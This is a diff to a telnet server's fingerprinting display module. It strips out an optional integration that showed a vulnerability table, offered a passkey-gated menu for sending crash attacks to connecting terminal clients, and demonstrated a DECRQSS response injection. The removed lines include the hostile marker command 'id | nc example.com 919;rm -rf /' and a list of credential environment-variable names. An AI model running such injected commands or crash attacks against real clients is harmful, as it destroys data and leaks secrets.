@@ -26,27 +26,6 @@ if TYPE_CHECKING:
     import blessed
     import prettytable
 
-# third-party (optional)
-try:
-    from tv_detect.attacks import PASSKEY as _TV_PASSKEY
-    from tv_detect.attacks import SEVERITY_COLOR
-    from tv_detect.attacks import DECRQSS_INJECT_MARKER as _DECRQSS_INJECT_MARKER
-    from tv_detect.execute import prompt_keys as _tv_prompt_keys
-    from tv_detect.execute import execute_attack as _tv_execute_attack
-    from tv_detect.execute import verify_passkey as _tv_verify_passkey
-    from tv_detect.execute import try_decrqss_injection
-    from tv_detect.execute import get_vulnerability_rows as _tv_vuln_rows
-    from tv_detect.execute import get_attacks_for_software as _tv_get_attacks
-
-    _HAS_TV_DETECT = True
-except ImportError:
-    _HAS_TV_DETECT = False
-    _TV_PASSKEY = ""
-
-#: Active passkey for tv-detect vulnerability gating.
-#: Set from client NEW-ENVIRON, REPL input, or ``--passkey`` CLI argument.
-_tv_passkey: str = ""
-
 # local
 from ._paths import _atomic_json_write  # noqa: E402
 from .accessories import PATIENCE_MESSAGES  # noqa: E402
@@ -115,14 +94,14 @@ def _log_identification(data: Dict[str, Any], names: Dict[str, str]) -> None:
 
 
 def _syslog_info(msg: str) -> None:
-    """Write an INFO-level message to syslog with tv-detect-telnet ident."""
+    """Write an INFO-level message to syslog with telnetlib3-fingerprint ident."""
     import syslog
     import inspect
 
     frame = inspect.currentframe()
     caller = frame.f_back if frame else None
     lineno = caller.f_lineno if caller else 0
-    syslog.openlog("tv-detect-telnet", syslog.LOG_PID)
+    syslog.openlog("telnetlib3-fingerprint", syslog.LOG_PID)
     syslog.syslog(syslog.LOG_INFO, f"INFO fingerprinting_display.py:{lineno} {msg}")
 
 
@@ -156,7 +135,7 @@ def _styled_input(term: "blessed.Terminal", prompt: str) -> str:
     _flush_input(term)
 
     # MUD clients: simple line input, no cursor tricks
-    if os.environ.get("TV_DETECT_TERMINAL") != "1":
+    if os.environ.get("TELNETLIB3_INTERACTIVE_TERMINAL") != "1":
         echo(prompt)
         return _read_line(term).strip()
 
@@ -228,7 +207,7 @@ def _run_ucs_detect() -> Optional[Dict[str, Any]]:
         "TERMINFO_DIRS",
     )
     env = {k: os.environ[k] for k in _PASSTHROUGH_KEYS if k in os.environ}
-    env["UCS_DETECT_SYSLOG"] = "tv-detect-telnet"
+    env["UCS_DETECT_SYSLOG"] = "telnetlib3-fingerprint"
 
     try:
         try:
@@ -628,101 +607,6 @@ def _build_telnet_rows(term: "blessed.Terminal", data: Dict[str, Any]) -> List[T
     return pairs
 
 
-#: Credential / secret env vars -- immediate red flag if leaked over telnet.
-_CRITICAL_ENV_VARS = frozenset(
-    {
-        # AWS credentials
-        "AWS_ACCESS_KEY_ID",
-        "AWS_SECRET_ACCESS_KEY",
-        "AWS_SESSION_TOKEN",
-        # SSH network topology -- reveals internal IPs / jump-host identity
-        "SSH_REMOTE_HOST",
-        "SSH_REMOTE_IP",
-        # API keys / tokens
-        "GITHUB_TOKEN",
-        "GH_TOKEN",
-        "GITLAB_TOKEN",
-        "GL_TOKEN",
-        "ANTHROPIC_API_KEY",
-        "OPENAI_API_KEY",
-        "STRIPE_SECRET_KEY",
-        "SENDGRID_API_KEY",
-        "HEROKU_API_KEY",
-        "NPM_TOKEN",
-        "SLACK_TOKEN",
-        "TWILIO_AUTH_TOKEN",
-        # Database credentials
-        "DATABASE_URL",
-        "PGPASSWORD",
-        "MYSQL_PWD",
-        "REDIS_URL",
-        # Azure / GCP
-        "AZURE_CLIENT_SECRET",
-        "GOOGLE_APPLICATION_CREDENTIALS",
-        # Generic secret patterns
-        "SECRET_KEY",
-        "API_KEY",
-        "PRIVATE_KEY",
-        "JWT_SECRET",
-        # Docker credentials
-        "DOCKER_PASSWORD",
-    }
-)
-
-#: Vars that are useful for a telnet session -- everything else is oversharing.
-_USEFUL_ENV_VARS = frozenset(
-    {
-        "TERM",
-        "TERM_PROGRAM",
-        "TERM_PROGRAM_VERSION",
-        "COLUMNS",
-        "LINES",
-        "COLORTERM",
-        "LANG",
-        "LC_ALL",
-        "LC_CTYPE",
-        "DISPLAY",
-        "USER",
-        "LOGNAME",
-        "EDITOR",
-        "VISUAL",
-        "IPADDRESS",
-        # MUD client MTTS/MNES capabilities (desirable to share)
-        "256_COLORS",
-        "ANSI",
-        "CHARSET",
-        "CLIENT_NAME",
-        "CLIENT_VERSION",
-        "MTTS",
-        "OSC_COLOR_PALETTE",
-        "OSC_HYPERLINKS",
-        "OSC_HYPERLINKS_MENU",
-        "OSC_HYPERLINKS_PROMPT",
-        "OSC_HYPERLINKS_SEND",
-        "OSC_HYPERLINKS_STYLE_BASIC",
-        "OSC_HYPERLINKS_STYLE_STATES",
-        "OSC_HYPERLINKS_TOOLTIP",
-        "SCREEN_READER",
-        "TERMINAL_TYPE",
-        "TLS",
-        "TRUECOLOR",
-        "UTF-8",
-        "VT100",
-        "WORD_WRAP",
-    }
-)
-
-
-def _osc8(url: str, text: str) -> str:
-    """Format an OSC 8 terminal hyperlink."""
-    return f"\x1b]8;;{url}\x1b\\{text}\x1b]8;;\x1b\\"
-
-
-_CVE_2005_0488_URL = "https://nvd.nist.gov/vuln/detail/CVE-2005-0488"
-_CVE_2005_1205_URL = "https://nvd.nist.gov/vuln/detail/CVE-2005-1205"
-_DECRQCRA_REF_URL = "https://dgl.cx/2023/09/ansi-terminal-security"
-
-
 def _extract_software_name(data: Dict[str, Any]) -> str:
     """
     Extract terminal software name from fingerprint data.
@@ -737,138 +621,6 @@ def _extract_software_name(data: Dict[str, Any]) -> str:
     telnet_probe = data.get("telnet-probe", {})
     extra = telnet_probe.get("session_data", {}).get("extra", {})
     return extra.get("TERM") or ""
-
-
-def _extract_passkey(data: Dict[str, Any]) -> str:
-    """
-    Extract passkey from client NEW-ENVIRON data.
-
-    Checks the env var from the telnet session's extra info
-    against the tv-detect passkey format.
-
-    :returns: Passkey string in ``KEY=VALUE`` format, or empty string.
-    """
-    if not _HAS_TV_DETECT:
-        return ""
-    telnet_probe = data.get("telnet-probe", {})
-    extra = telnet_probe.get("session_data", {}).get("extra", {})
-    envvar, _, expected = _TV_PASSKEY.partition("=")
-    value = extra.get(envvar, "")
-    if value == expected:
-        return str(_TV_PASSKEY)
-    return ""
-
-
-def _build_vulnerabilities_rows(
-    term: "blessed.Terminal", data: Dict[str, Any]
-) -> List[Tuple[str, str]]:
-    """
-    Build (key, value) tuples for the vulnerabilities table.
-
-    Only vulnerabilities that are actually detected are shown. CVE identifiers are on the left,
-    descriptions with the affected protocol/sequence in parentheses on the right.
-    """
-    high: List[Tuple[str, str]] = []
-    medium: List[Tuple[str, str]] = []
-    low: List[Tuple[str, str]] = []
-
-    _high = term.bold_firebrick1
-    _med = term.darkorange
-    _low = term.yellowgreen
-
-    # -- HIGH --
-
-    # DECRQSS injection
-    injection = data.get("injection_probe")
-    if injection and injection.get("injectable"):
-        ref = _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023")
-        high.append((ref, f"{_high('[HIGH]')} {_high('Response injection (DECRQSS)')}"))
-
-    # Terminal-specific vulnerabilities from tv-detect
-    if _HAS_TV_DETECT:
-        sw_name = _extract_software_name(data)
-        _sev_fn = {"HIGH": _high, "MEDIUM": _med, "LOW": _low}
-        for ref, sev, name in _tv_vuln_rows(sw_name, passkey=_tv_passkey):
-            fn = _sev_fn.get(sev, _low)
-            bucket = {"HIGH": high, "MEDIUM": medium, "LOW": low}.get(sev, low)
-            bucket.append((ref, f"{fn(f'[{sev}]')} {fn(name)}"))
-
-    # -- MEDIUM --
-
-    # NEW_ENVIRON oversharing
-    telnet_probe = data.get("telnet-probe", {})
-    session_data = telnet_probe.get("session_data", {})
-    extra = session_data.get("extra", {})
-    env_keys = [k for k in extra if k == k.upper() and extra[k]]
-    critical = sorted(k for k in env_keys if k in _CRITICAL_ENV_VARS)
-    overshared = sorted(
-        k for k in env_keys if k not in _CRITICAL_ENV_VARS and k not in _USEFUL_ENV_VARS
-    )
-    cve_refs = (
-        _osc8(_CVE_2005_0488_URL, "CVE-2005-0488")
-        + ", "
-        + _osc8(_CVE_2005_1205_URL, "CVE-2005-1205")
-    )
-    if critical:
-        high.append(
-            (
-                cve_refs,
-                f"{_high('[HIGH]')} {_high('LEAKED: ' + ', '.join(critical) + ' (NEW_ENVIRON)')}",
-            )
-        )
-    if overshared:
-        low.append(
-            (
-                cve_refs if not critical else "",
-                f"{_low('[LOW]')} "
-                f"{_low('Oversharing: ' + ', '.join(overshared) + ' (NEW_ENVIRON)')}",
-            )
-        )
-
-    # CVE probes from vt-houdini
-    cve_results = data.get("cve_results")
-    if not cve_results:
-        terminal_probe = data.get("terminal-probe", {})
-        cve_results = (
-            terminal_probe.get("session_data", {})
-            .get("terminal_results", {})
-            .get("cve_results", {})
-        )
-    for cve_id, result in sorted(cve_results.items()):
-        if result and result is not False:
-            url = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
-            label = _osc8(url, cve_id)
-            medium.append((label, f"{_med('[MEDIUM]')} {_med('Vulnerable')}"))
-
-    # -- LOW (screen scraping) --
-
-    sts_probe = data.get("sts_probe")
-    scrape = data.get("screen-scrape")
-    if sts_probe and sts_probe.get("sts"):
-        ref = _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023")
-        if scrape and scrape.get("method") == "sts":
-            low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (STS)')}"))
-        else:
-            low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (STS) supported')}"))
-
-    decrqcra_probe = data.get("decrqcra_probe")
-    if not decrqcra_probe and scrape:
-        decrqcra_probe = scrape
-    if decrqcra_probe:
-        ref = (
-            _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023")
-            if not (sts_probe and sts_probe.get("sts"))
-            else ""
-        )
-        if decrqcra_probe.get("decrqcra"):
-            if scrape and (scrape.get("screen_0") or scrape.get("screen_1")):
-                low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (DECRQCRA)')}"))
-            else:
-                low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (DECRQCRA) supported')}"))
-        elif scrape and scrape.get("method") != "sts" and "decrqcra" not in (scrape or {}):
-            low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (DECRQCRA) supported')}"))
-
-    return high + medium + low
 
 
 def _make_terminal(**kwargs: Any) -> "blessed.Terminal":
@@ -1021,14 +773,6 @@ def _display_compact_summary(
     telnet_rows = _build_telnet_rows(term, data)
     if telnet_rows:
         table_strings.append(make_table("Telnet", telnet_rows))
-
-    vuln_rows = _build_vulnerabilities_rows(term, data)
-    if vuln_rows:
-        vuln_count = len(vuln_rows)
-        vuln_title = "Vulnerabilities"
-        if vuln_count:
-            vuln_title += f" ({vuln_count})"
-        table_strings.append(make_table(vuln_title, vuln_rows))
 
     if not table_strings:
         return False
@@ -1311,7 +1055,7 @@ def _build_seen_counts(
     if username:
         title = f"{username} - {title}"
     # Only set xterm title for real terminal emulators, not MUD clients.
-    if os.environ.get("TV_DETECT_TERMINAL") == "1":
+    if os.environ.get("TELNETLIB3_INTERACTIVE_TERMINAL") == "1":
         echo(f"\x1b]0;{title}\x1b\\")
 
     if lines:
@@ -1371,15 +1115,8 @@ def _repl_prompt(term: "blessed.Terminal", software_name: str = "") -> None:
     lines = [
         f"{bk(term, 't')}ERM or TE{bk(term, 'l')}NET details?",  # codespell:ignore te
         f"{bk(term, 's')}ummarize, {bk(term, 'u')}pdate, or s{bk(term, 'h')}ow DB",
+        f"{bk(term, 'q')}uit",
     ]
-    if _HAS_TV_DETECT:
-        pk = _tv_prompt_keys(software_name=software_name, passkey=_tv_passkey)
-        if pk["available"]:
-            lines.append(f"{bk(term, 'v')}ulnerabilities, {bk(term, 'q')}uit")
-        else:
-            lines.append(f"{bk(term, 'q')}uit")
-    else:
-        lines.append(f"{bk(term, 'q')}uit")
     legend = "\r\n".join(lines)
     echo(f"\r{term.clear_eos}{term.normal}{legend}\r\n: ")
 
@@ -1407,10 +1144,6 @@ def _read_line(term: "blessed.Terminal") -> str:
         if len(ch) == 1 and ch.isprintable():
             buf.append(ch)
             echo(ch)
-
-
-if not _HAS_TV_DETECT:
-    _DECRQSS_INJECT_MARKER = "id | nc example.com 919;rm -rf /"  # noqa: F811
 
 
 def _paginate(term: "blessed.Terminal", text: str, **_kw: Any) -> None:
@@ -1559,90 +1292,6 @@ def _filter_telnet_detail(detail: Optional[Dict[str, Any]]) -> Optional[Dict[str
     return result
 
 
-def _vuln_menu(term: "blessed.Terminal", software_name: str = "") -> Optional[str]:
-    """
-    Show vulnerability attack menu, using tv-detect.
-
-    When the terminal is a known target, show only matching attacks. When unknown, show all attacks
-    so the user can try any of them.
-    """
-    if not _HAS_TV_DETECT:
-        return None
-    echo = functools.partial(print, end="", flush=True)
-    available = _tv_get_attacks("", passkey=_tv_passkey)
-    if not available:
-        echo(f"\r\n{term.bold('No attacks available for this terminal.')}\r\n")
-        return None
-    from tv_detect.attacks import VULN_WARNING, PRICING_MESSAGE
-
-    echo(f"\r\n{term.bold_gold1(VULN_WARNING)}\r\n\r\n")
-    authorized = _tv_verify_passkey(_tv_passkey)
-    max_sev = max(len(v["severity"]) for v in available.values())
-    max_id = max(len(k) for k in available)
-    for key in sorted(available, key=int):
-        attack = available[key]
-        sev = attack["severity"]
-        color_fn = getattr(term, SEVERITY_COLOR.get(sev, "normal"))
-        sev_str = color_fn(f"[{sev:^{max_sev}}]")
-        id_str = key.rjust(max_id)
-        target = attack.get("target", "")
-        target_str = f" ({target})" if target else ""
-        if attack.get("passkey_limited") and not authorized:
-            echo(
-                f"  ({term.bold(id_str)}) {sev_str}"
-                f" {term.bold_gold1(PRICING_MESSAGE)}{target_str}\r\n"
-            )
-        else:
-            echo(f"  ({term.bold(id_str)}) {sev_str} {attack['name']}{target_str}\r\n")
-    echo("\r\n: ")
-    key = _read_line(term).strip()
-    if key in available:
-        return key
-    return None
-
-
-def _execute_crash(
-    term: "blessed.Terminal", key: str, software_name: str = "", ip: str = "unknown"
-) -> None:
-    """Execute a vulnerability attack by key, delegating to tv-detect."""
-    if not _HAS_TV_DETECT:
-        return
-    echo = functools.partial(print, end="", flush=True)
-    client_label = f"Client {ip} {repr(software_name)}" if software_name else f"Client {ip}"
-    available = _tv_get_attacks("", passkey=_tv_passkey)
-    attack = available.get(key, {})
-    handler = attack.get("handler", "")
-
-    # Telnet-layer attacks can't be executed from the PTY subprocess.
-    # Exit with a special code so the server handles it after pty_shell.
-    if handler == "telnet_new_environ_user":
-        _syslog_info(f"{client_label} selects VULN-#{key} (telnet-layer)")
-        name = attack.get("name", "unknown")
-        echo(f"\r\n{term.bold_firebrick1('Crash')}: {name}{term.clear_eol}\r\n")
-        if note := attack.get("note"):
-            echo(f"  {term.bold_black(note)}{term.clear_eol}\r\n")
-        echo(f"{term.bold('Sending...')}{term.clear_eol}\r\n")
-        if key.isdigit() and 1 <= int(key) <= 99:
-            sys.exit(100 + int(key))
-        return
-
-    result = _tv_execute_attack(key, software_name="", passkey=_tv_passkey)
-    if result.get("executed"):
-        _syslog_info(f"{client_label} selects VULN-#{key} (permitted)")
-        # Only reset screen for raw sequence payloads that may move the cursor;
-        # handler-based attacks (ZMODEM, kitty, etc) manage their own output.
-        if not attack.get("handler"):
-            echo(f"{term.home}{term.clear_eos}")
-        name = result.get("attack_name", "unknown")
-        echo(f"\r\n{term.bold_firebrick1('Crash')}: {name}{term.clear_eol}\r\n")
-        if note := result.get("note"):
-            echo(f"  {term.bold_black(note)}{term.clear_eol}\r\n")
-        echo(f"{term.bold('Sent.')} The client may have crashed.{term.clear_eol}\r\n")
-    elif error := result.get("error"):
-        _syslog_info(f"{client_label} selects VULN-#{key} (denied)")
-        echo(f"\r\n{term.bold_gold1(error)}\r\n")
-
-
 def _show_detail(term: "blessed.Terminal", data: Dict[str, Any], section: str) -> None:
     """Show detailed JSON for a fingerprint section with pagination."""
     if section == "terminal":
@@ -1773,15 +1422,8 @@ def _fingerprint_repl(
     names: Optional[Dict[str, str]] = None,
 ) -> None:
     """Interactive REPL for exploring fingerprint data."""
-    global _tv_passkey
     ip = _client_ip(data)
     software_name = _extract_software_name(data)
-
-    # Check for passkey from client NEW-ENVIRON
-    if _HAS_TV_DETECT and not _tv_passkey:
-        env_passkey = _extract_passkey(data)
-        if env_passkey:
-            _tv_passkey = env_passkey
 
     _commands = {
         "q": "logoff",
@@ -1792,52 +1434,16 @@ def _fingerprint_repl(
         "h": "database",
         "\x0c": "refresh",
     }
-    if _HAS_TV_DETECT:
-        _commands["v"] = "vulnerabilities"
 
     db_cache = None
-    decrqss_tried = False
-
-    # Check if CVE-2008-2383 was previously detected as vulnerable
-    cve_results = data.get("cve_results", {})
-    decrqss_vulnerable = bool(cve_results.get("CVE-2008-2383"))
 
     while True:
         _repl_prompt(term, software_name=software_name)
         while term.inkey(timeout=0):
             pass
 
-        if _HAS_TV_DETECT and decrqss_vulnerable and not decrqss_tried:
-            decrqss_tried = True
-            if try_decrqss_injection():
-                echo(
-                    f"{term.bold_red}{_DECRQSS_INJECT_MARKER}{term.normal}\r\n"
-                    f"{term.bold_red}^^ injected via CVE-2008-2383 DECRQSS"
-                    f" echoback{term.normal}\r\n\r\n"
-                )
-                logger.info("%s: DECRQSS injection demonstrated", ip)
-                import select
-
-                while select.select([sys.stdin.fileno()], [], [], 0.2)[0]:
-                    os.read(sys.stdin.fileno(), 4096)
-                while term.inkey(timeout=0):
-                    pass
-                continue
-
         raw_input = _read_line(term).strip()
         cmd = raw_input.lower()
-
-        # Accept passkey entry: "passkey=USER=jEffREYtAblES"
-        if _HAS_TV_DETECT and raw_input.lower().startswith("passkey="):
-            candidate = raw_input[len("passkey=") :]
-            if _tv_verify_passkey(candidate):
-                _tv_passkey = candidate
-                logger.info("%s: passkey accepted", ip)
-                echo(f"\r\n{term.bold_green('Passkey accepted.')}\r\n")
-            else:
-                logger.info("%s: passkey rejected", ip)
-                echo(f"\r\n{term.bold_red('Invalid passkey.')}\r\n")
-            continue
 
         if not cmd:
             echo("\r: ")
@@ -1871,10 +1477,6 @@ def _fingerprint_repl(
             _prompt_fingerprint_identification(term, data, filepath, _names)
             names = _load_fingerprint_names()
             seen_counts = _build_seen_counts(data, names, term)
-        elif cmd == "v" and _HAS_TV_DETECT:
-            choice = _vuln_menu(term, software_name=software_name)
-            if choice:
-                _execute_crash(term, choice, software_name=software_name, ip=ip)
         elif cmd == "\x0c":
             echo(term.normal + term.clear)
             _display_compact_summary(data, term)
@@ -1981,7 +1583,7 @@ def _probe_terminal(filepath: str, data: Dict[str, Any]) -> Optional[str]:
         _atomic_json_write(filepath, data)
 
     # Skip terminal probing for MUD/line-mode clients
-    if os.environ.get("TV_DETECT_TERMINAL") != "1":
+    if os.environ.get("TELNETLIB3_INTERACTIVE_TERMINAL") != "1":
         return filepath
 
     if "screen-scrape" not in data:
@@ -2030,13 +1632,6 @@ def _process_client_fingerprint(filepath: str, data: Dict[str, Any]) -> None:
     filepath = _probe_terminal(filepath, data) or filepath
 
     _setup_term_environ(data)
-
-    # Extract passkey from client NEW-ENVIRON if not already set
-    global _tv_passkey
-    if _HAS_TV_DETECT and not _tv_passkey:
-        env_passkey = _extract_passkey(data)
-        if env_passkey:
-            _tv_passkey = env_passkey
 
     try:
         import blessed  # noqa: F401
